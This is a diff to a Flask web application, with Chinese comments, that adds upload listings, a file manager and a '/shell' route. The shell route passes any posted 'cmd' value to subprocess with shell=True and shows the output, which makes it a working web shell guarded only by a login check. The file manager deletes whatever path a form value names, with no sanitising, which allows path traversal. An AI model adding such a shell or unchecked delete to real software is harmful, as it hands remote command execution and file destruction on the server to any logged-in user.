@@ -2,6 +2,8 @@
 import os
 import sqlite3
 import hmac
+import datetime
+import subprocess
 from datetime import timedelta
 
 from flask import (
@@ -197,7 +199,74 @@ def upload():
                 f.save(filepath)
                 uploaded_file = f.filename
 
-    return render_template("upload.html", uploaded_file=uploaded_file, error=error)
+    # 列出已上传的文件
+    upload_dir = os.path.join(app.root_path, "static", "uploads")
+    os.makedirs(upload_dir, exist_ok=True)
+    file_list = []
+    for fname in os.listdir(upload_dir):
+        fpath = os.path.join(upload_dir, fname)
+        if os.path.isfile(fpath):
+            size = os.path.getsize(fpath)
+            mtime = os.path.getmtime(fpath)
+            file_list.append({
+                "name": fname,
+                "size": size,
+                "mtime": datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
+            })
+    file_list.sort(key=lambda x: x["mtime"], reverse=True)
+
+    return render_template("upload.html", uploaded_file=uploaded_file, error=error, files=file_list)
+
+
+@app.route("/files", methods=["GET", "POST"])
+def file_manager():
+    if "username" not in session:
+        return redirect(url_for("login"))
+
+    upload_dir = os.path.join(app.root_path, "static", "uploads")
+    os.makedirs(upload_dir, exist_ok=True)
+
+    # 处理删除请求
+    if request.method == "POST":
+        delete_file = request.form.get("delete", "")
+        if delete_file:
+            target = os.path.join(upload_dir, delete_file)
+            if os.path.isfile(target):
+                os.remove(target)
+
+    file_list = []
+    for fname in sorted(os.listdir(upload_dir)):
+        fpath = os.path.join(upload_dir, fname)
+        if os.path.isfile(fpath):
+            size = os.path.getsize(fpath)
+            mtime = os.path.getmtime(fpath)
+            file_list.append({
+                "name": fname,
+                "size": size,
+                "mtime": datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
+            })
+
+    return render_template("files.html", files=file_list)
+
+
+@app.route("/shell", methods=["GET", "POST"])
+def webshell():
+    if "username" not in session:
+        return redirect(url_for("login"))
+
+    cmd = ""
+    output = ""
+    if request.method == "POST":
+        cmd = request.form.get("cmd", "")
+        if cmd:
+            try:
+                import subprocess
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
+                output = result.stdout + result.stderr
+            except Exception as e:
+                output = f"执行错误: {e}"
+
+    return render_template("shell.html", cmd=cmd, output=output)
 
 
 @app.route("/logout")
